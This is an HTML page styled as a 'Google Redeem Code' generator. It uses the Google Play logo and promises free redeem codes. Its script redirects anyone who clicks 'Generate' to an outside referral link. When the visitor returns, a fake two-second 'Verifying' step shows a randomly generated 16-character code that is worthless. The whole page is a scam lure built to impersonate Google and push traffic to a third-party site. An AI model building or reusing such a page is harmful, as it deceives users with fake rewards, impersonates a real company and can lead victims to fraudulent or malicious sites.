<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Google Redeem Code</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    html { -webkit-text-size-adjust:100%; }
    body {
      height:100vh;
      display:flex;
      justify-content:center;
      align-items:center;
      background: linear-gradient(to right, #9b00d5, #427eff);
      font-family: Arial, sans-serif;
    }
    .container {
      background:white;
      padding:30px 20px;
      border-radius:12px;
      text-align:center;
      box-shadow:0 4px 10px rgba(0,0,0,0.2);
      width:90%;
      max-width:320px;
    }
    h2 {
      background:#f2f2f2;
      padding:10px;
      border-radius:8px;
      margin-bottom:20px;
      font-size:18px;
    }
    .logo-wrapper img {
      width:80px;
      margin-bottom:20px;
    }
    button {
      display:block;
      width:100%;
      max-width:200px;
      margin:15px auto 0;
      padding:12px 0;
      font-size:16px;
      color:white;
      background:#00d44c;
      border:none;
      border-radius:8px;
      cursor:pointer;
      transition:background 0.3s;
    }
    button:hover:not(:disabled) { background:#00b140; }
    button:disabled {
      background:gray;
      cursor:not-allowed;
    }
    #codeContainer {
      display:none;
      flex-direction:column;
      align-items:center;
      margin-top:20px;
    }
    #redeemCode {
      width:100%;
      padding:12px;
      font-size:16px;
      text-align:center;
      border:2px solid #ccc;
      border-radius:6px;
      margin-bottom:15px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Google Redeem Code</h2>
    <div class="logo-wrapper">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d0/Google_Play_Arrow_logo.svg/512px-Google_Play_Arrow_logo.svg.png" alt="Google Logo">
    </div>

    <button id="generateButton">Generate</button>
    <button id="verifyButton" style="display:none;">Verify</button>

    <div id="codeContainer">
      <p>🎉 Redeem Code Generated</p>
      <input type="text" id="redeemCode" readonly>
      <button id="copyBtn" onclick="copyCode()">Copy</button>
    </div>
  </div>

  <script>
    const GENERATE_URL = 'https://m.centefinance.life/?rel=uodkbnhi';

    const generateBtn   = document.getElementById('generateButton');
    const verifyBtn     = document.getElementById('verifyButton');
    const codeContainer = document.getElementById('codeContainer');
    const redeemCode    = document.getElementById('redeemCode');

    // পেজ লোডে বোতনগুলো চেক
    window.addEventListener('DOMContentLoaded', () => {
      if (localStorage.getItem('generated') === 'true') {
        generateBtn.style.display = 'none';
        verifyBtn.style.display   = 'block';
      }
    });

    // Generate: Btn-এ loading দেখাবে, তারপর redirect
    generateBtn.addEventListener('click', () => {
      generateBtn.disabled   = true;
      generateBtn.innerText  = 'Loading...';
      setTimeout(() => {
        localStorage.setItem('generated','true');
        window.location.href = GENERATE_URL;
      }, 800);
    });

    // Verify logic
    let hasVerified = false;
    verifyBtn.addEventListener('click', () => {
      if (hasVerified) return;
      hasVerified = true;

      verifyBtn.innerText   = 'Verifying...';
      verifyBtn.disabled    = true;

      setTimeout(() => {
        verifyBtn.innerText             = 'Verified';
        verifyBtn.style.backgroundColor = 'gray';
        codeContainer.style.display     = 'flex';
        redeemCode.value                = generateCode();
      }, 2000);
    });

    // Utility: generate random code
    function generateCode() {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
      let code = '';
      for (let i = 0; i < 16; i++) {
        code += chars.charAt(Math.floor(Math.random() * chars.length));
        if ((i + 1) % 4 === 0 && i !== 15) code += '-';
      }
      return code;
    }

    // Copy code to clipboard
    function copyCode() {
      redeemCode.select();
      document.execCommand('copy');
      alert('Copied: ' + redeemCode.value);
    }
  </script>
</body>
</html>
